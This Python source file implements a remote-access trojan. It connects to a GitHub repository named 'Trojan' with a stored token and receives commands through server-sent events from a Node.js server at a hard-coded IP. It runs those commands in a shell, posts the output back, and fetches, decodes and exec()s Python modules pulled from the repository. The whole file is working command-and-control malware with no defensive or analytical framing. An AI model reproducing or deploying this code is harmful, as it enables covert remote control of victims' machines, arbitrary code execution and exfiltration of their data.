import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess
import requests
import sseclient  # Install this package via `pip install sseclient-py`
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = True

    def get_github_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        return json.loads(base64.b64decode(config_json))

    def send_command_result(self, command, result):
        try:
            payload = {
                "command": command,
                "result": result
            }
            requests.post(f"{self.node_server_url}/command", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to send command result to Node.js server: {e}")

    def update_status(self, status):
        try:
            payload = {
                "id": self.id,
                "status": status
            }
            requests.post(f"{self.node_server_url}/status", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to update status on Node.js server: {e}")

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
        except subprocess.CalledProcessError as e:
            result = e.output.decode('utf-8')
        self.send_command_result(command, result)

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def listen_for_commands(self):
        # Establish SSE connection to Node.js server
        response = requests.get(f"{self.node_server_url}/events", stream=True)
        client = sseclient.SSEClient(response)
        
        for event in client.events():
            command = json.loads(event.data)
            if 'stop' in command:
                print("[*] Stop signal received.")
                self.running = False
                self.update_status("Trojan stopped.")
                break
            elif command.get('action') == 'run_module':
                module_name = command.get('module')
                if module_name:
                    print(f"[*] Running module: {module_name}")
                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
                    thread.start()
            elif 'command' in command:
                command_str = command.get('command')
                if command_str:
                    print(f"[*] Executing command: {command_str}")
                    self.execute_command(command_str)
            else:
                print(f"[*] Invalid command format: {command}")

    def run(self):
        self.listen_for_commands()

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
    trojan = Trojan('abc', NODE_SERVER_URL)
    trojan.run()

